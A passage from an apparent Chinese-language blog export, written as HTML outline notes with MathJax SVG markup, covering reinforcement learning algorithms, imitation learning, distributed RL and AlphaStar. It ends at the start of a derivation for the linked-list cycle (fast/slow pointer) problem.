data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="msub" transform="translate(1451.6, 0)"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g><g data-mml-node="TeXAtom" transform="translate(570, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z"></path></g><g data-mml-node="TeXAtom" transform="translate(469, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(485, 0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(783, 0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></g></g></g></g></svg></mjx-container></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>TRPO (Trust Region Policy Optimization)<ul>
<li>MM alg (EM)</li>
<li>存在问题<ul>
<li>计算量大</li>
<li>需要样本多</li>
<li>Conjugate Gradient (CG)本身较为复杂</li>
<li>部分表现差于DQN</li>
</ul>
</li>
</ul>
</li>
<li>ACKTR<ul>
<li>提高TRPO的计算效率<ul>
<li>K-FAC加速FIM求逆</li>
</ul>
</li>
</ul>
</li>
<li>PPO<ul>
<li>TRPO的简化（将约束作为惩罚）应用广泛</li>
<li>一阶优化（SGD）</li>
<li>with clipping（简单易实现）</li>
</ul>
</li>
</ul>
</li>
<li>Q-learning<ul>
<li>DDPG<ul>
<li>将DQN扩展到连续动作空间</li>
</ul>
</li>
<li>Twin Delayed DDPG (TD3)<ul>
<li>DDPG有时会过大估计Q值</li>
<li>改进<ul>
<li>Clipped Double-Q Learning<ul>
<li>2个Q函数取较小值</li>
</ul>
</li>
<li>Delayed Policy Update</li>
<li>Target Policy Smoothing<ul>
<li>noise + clip</li>
</ul>
</li>
</ul>
</li>
<li>官方代码非常值得学习</li>
</ul>
</li>
<li>Soft Actor-Critic (SAC)<ul>
<li><strong>Entropy</strong>-regularized RL</li>
<li>Reparameterization Trick</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="基于环境模型的RL方法"><a href="#基于环境模型的RL方法" class="headerlink" title="基于环境模型的RL方法"></a>基于环境模型的RL方法</h1><ul>
<li>简介<ul>
<li>学习环境模型</li>
<li>Plan</li>
<li>sample效率高（现实应用中非常重要）</li>
<li>难以收敛、2个误差</li>
</ul>
</li>
<li>Model-based value optimization<ul>
<li>model <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> simulated trajectoried <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> values <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> policy</li>
<li>Model<ul>
<li>Table Lookup 计数</li>
</ul>
</li>
<li>Dyna(1991)<ul>
<li>用少量真实轨迹估计模型</li>
</ul>
</li>
</ul>
</li>
<li>Model-based policy optimization<ul>
<li>model <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> policy</li>
<li>Optimal Control<ul>
<li>LQR/iLQR</li>
</ul>
</li>
<li>MPC</li>
</ul>
</li>
<li>案例 Robotic Object Manipulation<ul>
<li>PILCO(2011)</li>
<li>(2015)</li>
</ul>
</li>
</ul>
<h1 id="模仿学习IL"><a href="#模仿学习IL" class="headerlink" title="模仿学习IL"></a>模仿学习IL</h1><ul>
<li>简介<ul>
<li>policy network的监督学习</li>
</ul>
</li>
<li>Behavioral cloning (BC)<ul>
<li>off-course situation中表现差</li>
</ul>
</li>
<li>DAgger: Dataset Aggregation<ul>
<li>使数据分布尽可能一致</li>
<li>人工标记 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> 其它算法来标记</li>
</ul>
</li>
<li>Inverse RL (IRL)<ul>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="7.605ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3361.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mi" transform="translate(759, -150) scale(0.707)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z"></path></g></g><g data-mml-node="mo" transform="translate(1140.6, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1529.6, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(1998.6, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(2443.3, 0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2972.3, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></li>
<li>Guided Cost Learning (2016)</li>
</ul>
</li>
<li>GAIL: Generative Adversarial IL (2016)<ul>
<li>类比GAN的思想生成轨迹</li>
</ul>
</li>
<li>进一步改进<ul>
<li>Multimodal/Non-Markovian behavior</li>
<li>多峰高斯输出</li>
</ul>
</li>
<li>结合IL和RL<ul>
<li>Pretrain &amp; Finetune</li>
<li>Off-policy</li>
<li>IL as an auxiliary loss function</li>
</ul>
</li>
<li>案例<ul>
<li>BC 自动驾驶、无人机</li>
<li>IL LSTM (2018)</li>
<li>Motion Imitation (2018)<ul>
<li>PPO</li>
<li>去掉MoCap数据</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="RL分布式系统"><a href="#RL分布式系统" class="headerlink" title="RL分布式系统"></a>RL分布式系统</h1><ul>
<li>分布式ML<ul>
<li>分布式操作系统 MIT EECS 6.824</li>
<li>Consistency, Fault tolerance, Communication</li>
<li>Model/Data parallelism</li>
<li>Sync/Async Update</li>
<li>Hogwild(2011)<ul>
<li>Lock-free async SGD</li>
</ul>
</li>
<li>Jeff Dean<ul>
<li>MapReduce(2004)</li>
<li>DisBelief(2012)</li>
</ul>
</li>
<li>AlexNet(2012)</li>
</ul>
</li>
<li>分布式RL<ul>
<li>DQN(2013)</li>
<li>GORILA(2015)</li>
<li>A3C(2016)<ul>
<li>async</li>
<li>CPU多线程actor</li>
</ul>
</li>
<li>A2C(2017)<ul>
<li>sync</li>
<li>GPU</li>
</ul>
</li>
<li>Ape-X(2018)<ul>
<li>Distributed DQN/DDPG</li>
</ul>
</li>
<li>IMPALA(2018)<ul>
<li>actor只产生experience而不是gradient</li>
<li>IS</li>
</ul>
</li>
<li>RLLib(2018)<ul>
<li>将不同算法模块化 reuse</li>
</ul>
</li>
<li>Evolution Strategies(2017)</li>
</ul>
</li>
<li>案例<ul>
<li>AlphaGo</li>
<li>OpenAI Five</li>
<li>AlphaStar<ul>
<li>PPO</li>
<li>Rapid训练框架</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="完结篇"><a href="#完结篇" class="headerlink" title="完结篇"></a>完结篇</h1><p>RL in a nutshell</p>
<ul>
<li>Basics of RL</li>
<li>MDP and tabular solution methods</li>
<li>价值函数近似</li>
<li>策略优化<ul>
<li>Log Derivative Trick vs. Reparameterization Trick</li>
<li><a href="https://spinningup.openai.com">Spinning-Up</a> 各种RL算法的原理和实现</li>
</ul>
</li>
<li>其它主题<ul>
<li>Model-based RL 效率高、存在2处近似误差</li>
<li>模仿学习 policy的监督学习</li>
<li>分布式系统</li>
</ul>
</li>
<li>Open problems<ul>
<li>Sample efficiency</li>
<li>Generalist RL rather than specialist RL</li>
<li>New env and agent designs<ul>
<li><a href="https://github.com/Unity-Technologies/ml-agents">ml-agents</a></li>
</ul>
</li>
<li>Bridge RL with other ML topics<ul>
<li>Yann LeCun’s cake</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="番外-剖析星际争霸AI-AlphaStar"><a href="#番外-剖析星际争霸AI-AlphaStar" class="headerlink" title="番外 剖析星际争霸AI AlphaStar"></a>番外 剖析星际争霸AI AlphaStar</h1><p>Nature</p>
<ul>
<li>简介</li>
<li>环境设计<ul>
<li>状态 4<ul>
<li>实体信息（链表向量）（不定长）</li>
<li>地图信息（图像）</li>
<li>玩家数据和游戏设计（标量）</li>
</ul>
</li>
<li>动作 6 Autoregressive<ul>
<li>层级解耦</li>
</ul>
</li>
</ul>
</li>
<li>网络结构<ul>
<li>MLP Transformer ResNet（处理输入）</li>
<li>Deep LSTM（core）</li>
<li>指针网络</li>
<li>串行输出</li>
</ul>
</li>
<li>监督学习<ul>
<li>解决网络初始化问题</li>
</ul>
</li>
<li>强化学习<ul>
<li>off-policy</li>
<li>AC结构，基于IMPALA</li>
<li>重要性采样</li>
</ul>
</li>
<li>RL - V-trace<ul>
<li>限制重要性采样系数，解决Off-policy</li>
<li>来自IMPALA</li>
</ul>
</li>
<li>RL - UPGO Upgoing Policy Update<ul>
<li>解决优势估算的问题 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.626ex" xmlns="http://www.w3.org/2000/svg" width="3.118ex" height="2.554ex" role="img" focusable="false" viewBox="0 -852.1 1378.4 1128.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mi" transform="translate(786, 369.2) scale(0.707)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mi" transform="translate(786, -269) scale(0.707)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g></g></g></svg></mjx-container></li>
<li>GAE来自PPO</li>
</ul>
</li>
<li>RL - TD(<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.027ex" xmlns="http://www.w3.org/2000/svg" width="1.319ex" height="1.597ex" role="img" focusable="false" viewBox="0 -694 583 706"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D706" d="M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z"></path></g></g></g></svg></mjx-container>)<ul>
<li>同时输入对手数据</li>
</ul>
</li>
<li>模仿学习<ul>
<li>注入人类信息，助力RL</li>
<li>人类统计量<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="1.636ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 723 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g></g></g></svg></mjx-container>来计算伪奖励函数（胜负奖励之外）75%概率置0<ul>
<li>编辑距离 汉明距离（01不同）</li>
</ul>
</li>
</ul>
</li>
<li>自学习 Self-play<ul>
<li>策略循环问题<ul>
<li>虚拟自学习 Fictitious Self-Play FSP 存档得到种群，从中<strong>均匀随机</strong>选择<ul>
<li>对手太菜时浪费时间</li>
</ul>
</li>
<li>Prioritized FSP</li>
</ul>
</li>
</ul>
</li>
<li>联盟训练 League Training（最大创新）探索policy空间<ul>
<li>对手池 = 联盟<ul>
<li>主智能体 3 50% 35% 15% 永不重置 主要对象</li>
<li>联盟利用者 6 发现全局弱点</li>
<li>主利用者 3 发现主智能体弱点</li>
</ul>
</li>
</ul>
</li>
<li>实验结果<ul>
<li>消融实验 Ablation Study 比较各部分的重要性<ul>
<li>人类数据极其重要</li>
</ul>
</li>
</ul>
</li>
<li>总结（成功经验）<ul>
<li>高度复杂的神经网络融合了列表、图像、标量信息等输⼊</li>
<li>通过Autoregressive的网络设计解耦了结构化的动作空间</li>
<li>模仿学习和监督学习的成功运用（统计量量Z等）</li>
<li>复杂的强化学习算法</li>
<li>复杂的联盟训练策略</li>
<li>大量计算资源（40d+）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
      <tags>
        <tag>强化学习</tag>
      </tags>
  </entry>
  <entry>
    <title>环形链表公式推导（快慢指针）</title>
    <url>/2020/02/06/%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8%E5%85%AC%E5%BC%8F%E6%8E%A8%E5%AF%BC%EF%BC%88%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88%EF%BC%89/</url>
    <content><![CDATA[<p><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii">LeetCode 142</a>的关于快慢指针通用情况的公式推导</p>
<span id="more"></span>
<p>假设环存在，设<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex" xmlns="http://www.w3.org/2000/svg" width="1.061ex" height="1.023ex" role="img" focusable="false" viewBox="0 -442 469 452"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g></svg></mjx-container>为慢指针，每次走一步；<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex" xmlns="http://www.w3.org/2000/svg" width="1.244ex" height="2.059ex" role="img" focusable="false" viewBox="0 -705 550 910"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g></g></g></svg></mjx-container>为快指针，每次走2步。设2者在环中距离入口处<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.971ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 429 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container>相遇，且出发点与环入口距离为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex" xmlns="http://www.w3.org/2000/svg" width="1.197ex" height="1.02ex" role="img" focusable="false" viewBox="0 -441 529 451"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></svg></mjx-container>，环长度为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.674ex" height="1.595ex" role="img" focusable="false" viewBox="0 -694 298 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 